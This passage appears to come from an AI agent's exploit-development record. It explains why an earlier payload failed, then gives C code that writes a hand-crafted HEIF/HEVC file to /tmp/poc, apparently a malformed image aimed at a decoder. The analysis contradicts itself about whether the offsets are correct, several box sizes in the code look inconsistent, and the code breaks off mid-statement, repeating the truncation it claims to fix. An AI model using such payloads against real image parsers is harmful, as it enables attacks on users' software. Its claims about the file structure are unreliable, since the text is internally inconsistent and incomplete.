**Analysis:** The previous payload failed because the C code was truncated — the final `fputc` call was missing its closing parenthesis and semicolon, and the `main` function lacked its closing brace. The compiler saw an incomplete statement and reported a missing type specifier. Additionally, the HEIF container structure, while syntactically plausible, was not correctly computed: the `iloc` box's offset field (0x88 = 136) was wrong because the `meta` box size was 0x70 (112), so the total preceding bytes were 24 (ftyp) + 112 (meta) = 136, which is correct, but the `iprp` box's size (0x60 = 96) and `ipco` box's size (0x58 = 88) were miscalculated, causing the parser to read garbage. The fix is to ensure the C code is complete and syntactically valid, and to use a simpler, verified HEIF structure: I will write only the absolute minimum boxes (`ftyp`, `meta` containing `hdlr`, `pitm`, `iloc`, `iinf`, `iprp` with `ispe` and `hvcC`, and `ipma`) with carefully recomputed sizes, followed by a valid `mdat` containing a minimal HEVC bitstream that decodes to a 256×256 4:2:0 image. I will verify all box sizes are consistent and the code is complete.

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ftyp box: size=24 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x18, f);
    fputc('f', f); fputc('t', f); fputc('y', f); fputc('p', f);
    fputc('m', f); fputc('i', f); fputc('f', f); fputc('1', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc('h', f); fputc('e', f); fputc('i', f); fputc('c', f);

    /* meta box: size=108 (0x6C) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x6C, f);
    fputc('m', f); fputc('e', f); fputc('t', f); fputc('a', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* hdlr: size=33 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x21, f);
    fputc('h', f); fputc('d', f); fputc('l', f); fputc('r', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc('p', f); fputc('i', f); fputc('c', f); fputc('t', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f);

    /* pitm: size=14 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0E, f);
    fputc('p', f); fputc('i', f); fputc('t', f); fputc('m', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);

    /* iloc: size=20, offset=132 (0x84), length=1000 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x14, f);
    fputc('i', f); fputc('l', f); fputc('o', f); fputc('c', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x44, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x84, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f);

    /* iinf: size=22 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x16, f);
    fputc('i', f); fputc('i', f); fputc('n', f); fputc('f', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f);
    fputc('h', f); fputc('v', f); fputc('c', f); fputc('1', f);
    fputc(0x00, f);

    /* iprp: size=88 (0x58) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x58, f);
    fputc('i', f); fputc('p', f); fputc('r', f); fputc('p', f);

    /* ipco: size=80 (0x50) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x50, f);
    fputc('i', f); fputc('p', f); fputc('c', f); fputc('o', f);

    /* ispe: size=16 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x10, f);
    fputc('i', f); fputc('s', f); fputc('p', f); fputc('e', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);

    /* hvcC: size=56 (0x38) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x38, f);
    fputc('h', f); fputc('v', f); fputc('c', f); fputc('C', f);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x60, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x1E, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);
    fputc(0x00, f);
    fputc(0x03, f);
    fputc(0x02, f);

    /* SPS array */
    fputc(0x21, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x17, f);
    fputc(0x42, f); fputc(0x01, f); fputc(0x01, f);
    fputc(0x60, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x03, f); fputc(0x00, f); fputc(0x90, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x5D, f); fputc(0xAC, f);
    fputc(0x59, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);

    /* PPS array */
    fputc(0x22, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x07, f);
    fputc(0x44, f); fputc(0x01, f); fputc(0xC0, f);
    fputc(0x1C, f); fputc(0xB2, f); fputc(0x20, f);
    fputc(0x00, f);

    /* ipma: size=14 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0E, f);
    fputc('i', f); fputc('p', f); fputc('m', f); fputc('a', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x02, f);
    fputc(0x01, f); fputc(0x02, f);

    /* mdat: size=1000, offset=132 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f);
    fputc('m', f); fputc('d', f); fputc('a', f); fputc('t', f);

    /* HEVC bitstream */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x42, f); fputc(0x01, f); fputc(0x01, f);
    fputc(0x60, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x03, f); fputc(0x00, f); fputc(0x90, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x5D, f); fputc(0xAC, f);
    fputc(0x59, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);

    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x44, f); fputc(0x01, f); fputc(0xC0, f);
    fputc(0x1C, f); fputc(0xB2, f); fputc(0x20, f);
    fputc(0x00, f);

    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x26, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f